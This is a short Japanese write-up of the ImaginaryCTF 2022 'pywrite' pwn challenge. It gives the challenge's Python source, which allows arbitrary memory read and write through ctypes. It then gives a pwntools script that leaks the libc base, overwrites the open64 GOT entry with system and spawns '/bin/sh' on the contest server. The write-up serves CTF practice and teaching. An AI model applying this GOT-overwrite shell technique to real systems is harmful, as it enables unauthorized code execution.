---
layout: chall
ctf_name: imaginaryctf_2022
problem_name: pywrite
genre: pwn
solved_date: 2022-07-18
during_ctf: true
tag: [python]
fav: false
difficulty: easy
---

### 概要

```py
from ctypes import c_ulong

def read(where):
  return c_ulong.from_address(where).value

def write(what, where):
  c_ulong.from_address(where).value = what

menu = '''|| PYWRITE ||
1: read
2: write
> '''

while True:
  choice = int(input(menu))
  if choice == 1:
    where = int(input("where? "))
    print(read(where))
  if choice == 2:
    what = int(input("what? "))
    where = int(input("where? "))
    write(what, where)
  if choice == 3:
    what = input("what????? ")
    a = open(what)
    print(a)
```


### 解法

`open(input())` が呼ばれた時点で何らかの関数を呼び出してファイルを open しているはずなので、この関数の got を書き換えれば `system(/bin/sh)` ができるはずである。`open` が呼んでいる関数は `open64`  だったので、そこの got を `system` に書き換えた。

<details><summary>スクリプト</summary>

```py
from pwn import *

chall = ELF("python3")
context.binary = chall

# stream = process('./run.sh')
stream = remote('pywrite.chal.imaginaryctf.org', 1337)

def aar(addr):
  stream.sendlineafter(b'> ', b'1')
  stream.sendlineafter(b'? ', str(addr).encode())
  return int(stream.recvline(keepends=True).decode())

def aaw(addr, val):
  stream.sendlineafter(b'> ', b'2')
  stream.sendlineafter(b'? ', str(val).encode())
  stream.sendlineafter(b'? ', str(addr).encode())

libc_addr = aar(0x8f6060) - 0x8e020
print(f'[+] {hex(libc_addr)=}')

libc = ELF('libc.so.6')
libc.address = libc_addr

aaw(chall.got['open64'], libc.symbols['system'])

stream.sendline(b'3')
stream.sendline(b'/bin/sh')

stream.interactive()
```

</details>

